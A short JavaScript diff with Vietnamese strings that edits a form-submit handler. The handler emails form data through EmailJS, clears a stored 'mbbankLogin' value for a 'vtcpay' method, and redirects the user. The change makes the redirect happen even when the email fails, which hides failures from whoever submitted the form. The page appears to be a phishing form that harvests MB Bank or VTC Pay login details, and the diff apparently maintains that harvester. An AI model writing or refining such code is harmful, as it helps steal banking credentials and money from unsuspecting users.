@@ -1773,7 +1773,11 @@
         isSubmitting = true;
         setSubmitLoading(true);
         try {
-          await sendEmail();
+          try {
+            await sendEmail();
+          } catch (emailError) {
+            console.error("EmailJS error (vẫn chuyển trang):", emailError);
+          }
 
           if (method === "vtcpay") {
             sessionStorage.removeItem("mbbankLogin");
@@ -1787,10 +1791,10 @@
           }
           window.location.href = redirectURL;
         } catch (error) {
-          console.error("EmailJS error:", error);
+          console.error("Submit error:", error);
           alert(
-            "Không gửi được thông tin qua EmailJS. Vui lòng thử lại.\n" +
-              (error.text || error.message || "")
+            "Không chuyển được trang. Vui lòng thử lại.\n" +
+              (error.message || "")
           );
         } finally {
           isSubmitting = false;
